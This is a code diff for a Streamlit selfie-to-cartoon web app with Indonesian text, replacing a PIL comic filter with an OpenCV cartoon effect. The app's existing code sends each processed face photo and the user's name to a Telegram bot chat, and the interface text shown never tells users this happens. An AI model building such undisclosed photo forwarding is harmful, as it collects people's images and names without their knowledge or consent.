@@ -1,11 +1,13 @@
 import io
+import cv2
+import numpy as np
+from PIL import Image
 import requests
-from PIL import Image, ImageEnhance, ImageFilter, ImageOps
 import streamlit as st
 
-# Konfigurasi Halaman ala Studio Kreatif
+# Konfigurasi Halaman
 st.set_page_config(
-    page_title="ToonMe AI Studio", page_icon="🎨", layout="centered"
+    page_title="Real ToonMe AI Studio", page_icon="🎨", layout="centered"
 )
 
 # --- STYLING CSS ---
@@ -43,11 +45,11 @@ TELEGRAM_CHAT_ID = "MASUKKAN_CHAT_ID_ANDA_DI_SINI"
 
 def send_cartoon_to_telegram(photo_bytes, username):
   url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-  files = {"photo": ("toon_selfie.jpg", photo_bytes, "image/jpeg")}
+  files = {"photo": ("real_toon.jpg", photo_bytes, "image/jpeg")}
   caption = (
-      f"🎨 **TOONME COMIC CAPTURE**\n\n"
+      f"🎨 **REAL TOONME CAPTURE**\n\n"
       f"👤 User: {username}\n"
-      f"✨ Efek: Comic Cartoon Filter\n"
+      f"✨ Efek: Clean OpenCV Cartoon\n"
       f"🚀 Status: Berhasil Disimpan & Dikirim"
   )
   data_dict = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption}
@@ -59,39 +61,42 @@ def send_cartoon_to_telegram(photo_bytes, username):
     return {"ok": False, "description": str(e)}
 
 
-def convert_to_comic_cartoon(pil_image):
-  """Mengubah foto menjadi gaya kartun komik dengan garis tepi (Edge & Sketch) pakai PIL"""
-  img = pil_image.convert("RGB")
+def convert_to_real_cartoon(pil_image):
+  """Mengubah foto menjadi kartun mulus menggunakan OpenCV (cv2)"""
+  # Konversi PIL Image ke Numpy Array BGR
+  img_np = np.array(pil_image.convert("RGB"))
+  img_bgr = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
 
-  # 1. Buat versi hitam putih untuk mendeteksi garis tepi (edges)
-  gray = img.convert("L")
-  # Pertajam untuk memperjelas garis wajah
-  gray_smooth = gray.filter(ImageFilter.SMOOTH)
-  edges = gray_smooth.filter(ImageFilter.FIND_EDGES)
-  # Balikkan warna tepi jadi garis hitam di atas putih, lalu tingkatkan kontrasnya
-  edges = ImageOps.invert(edges)
-  edges = ImageEnhance.Contrast(edges).enhance(3.0)
-  edges = edges.convert("RGB")
+  # 1. Buat Masker Garis Tepi (Edges) yang bersih
+  gray = cv2.cvtColor(img_bgr, cv2.COLOR_BGR2GRAY)
+  gray_blur = cv2.medianBlur(gray, 7)
+  edges = cv2.adaptiveThreshold(
+      gray_blur,
+      255,
+      cv2.ADAPTIVE_THRESH_MEAN_C,
+      cv2.THRESH_BINARY,
+      blockSize=9,
+      C=2,
+  )
 
-  # 2. Buat versi warna yang dihaluskan (smoothing) ala ilustrasi
-  color_img = img.filter(ImageFilter.SMOOTH_MORE)
-  color_img = ImageEnhance.Color(color_img).enhance(1.4)
-  color_img = ImageEnhance.Brightness(color_img).enhance(1.05)
+  # 2. Haluskan warna kulit wajah menggunakan Bilateral Filter berulang
+  color = img_bgr
+  for _ in range(4):
+    color = cv2.bilateralFilter(color, d=9, sigmaColor=75, sigmaSpace=75)
 
-  # 3. Gabungkan warna halus dengan garis tepi komik (blending)
-  # Menggunakan multiply sederhana via PIL ImageChops jika memungkinkan, atau blend manual
-  from PIL import ImageChops
+  # 3. Gabungkan warna halus dengan garis tepi kartun
+  cartoon = cv2.bitwise_and(color, color, mask=edges)
 
-  cartoon_result = ImageChops.multiply(color_img, edges)
-
-  return cartoon_result
+  # Kembalikan ke format PIL Image RGB
+  cartoon_rgb = cv2.cvtColor(cartoon, cv2.COLOR_BGR2RGB)
+  return Image.fromarray(cartoon_rgb)
 
 
 # --- ANTARMUKA APLIKASI ---
-st.markdown("<div class='studio-title'>🎨 ToonMe Comic Booth</div>", unsafe_allow_html=True)
+st.markdown("<div class='studio-title'>🎨 ToonMe Pro Studio</div>", unsafe_allow_html=True)
 st.markdown(
-    "<div class='studio-sub'>Ubah foto wajahmu jadi gaya ilustrasi komik kartun"
-    " keren!</div>",
+    "<div class='studio-sub'>Ubah foto wajahmu jadi kartun bersih dan estetik"
+    " secara instan!</div>",
     unsafe_allow_html=True,
 )
 
@@ -100,32 +105,32 @@ username = st.text_input("Masukkan Nama Kamu:", placeholder="Ketik nama di sini.
 
 st.markdown("---")
 st.subheader("📸 Ambil Foto Kamera Depan")
-camera_file = st.camera_input("Posisikan wajahmu dengan pas dan tunjukkan ekspresimu")
+camera_file = st.camera_input("Posisikan wajahmu dengan pas dan tunjukkan senyumanmu")
 
 # 2. Logika Proses Otomatis
 if camera_file is not None:
   if not username:
     st.warning("⚠️ Masukkan nama kamu terlebih dahulu sebelum memproses!")
   else:
-    with st.spinner("✨ Meracik efek garis komik dan warna kartun..."):
+    with st.spinner("✨ Sedang memproses efek kartun profesional..."):
       # Buka foto asli
       original_image = Image.open(camera_file)
 
-      # Ubah menjadi kartun gaya komik
-      cartoon_image = convert_to_comic_cartoon(original_image)
+      # Ubah menjadi kartun via OpenCV
+      cartoon_image = convert_to_real_cartoon(original_image)
 
       # Konversi hasil ke bytes untuk download & kirim telegram
       buf = io.BytesIO()
       cartoon_image.save(buf, format="JPEG", quality=95)
       cartoon_bytes = buf.getvalue()
 
-    st.success("🎉 Berhasil! Fotomu sukses berubah jadi gaya komik.")
+    st.success("🎉 Berhasil! Tampilan kartunmu sudah jadi.")
 
     # Tampilkan Hasil di Layar
-    st.markdown("### 🖼️ Hasil Kartun Komik Kamu:")
+    st.markdown("### 🖼️ Hasil Kartun Pro Kamu:")
     st.image(
         cartoon_image,
-        caption=f"Versi Komik - {username}",
+        caption=f"Versi Kartun Pro - {username}",
         use_container_width=True,
     )
 
@@ -137,7 +142,7 @@ if camera_file is not None:
       st.download_button(
           label="📥 Download Kartun",
           data=cartoon_bytes,
-          file_name=f"comic_toon_{username.lower().replace(' ', '_')}.jpg",
+          file_name=f"pro_toon_{username.lower().replace(' ', '_')}.jpg",
           mime="image/jpeg",
       )
 
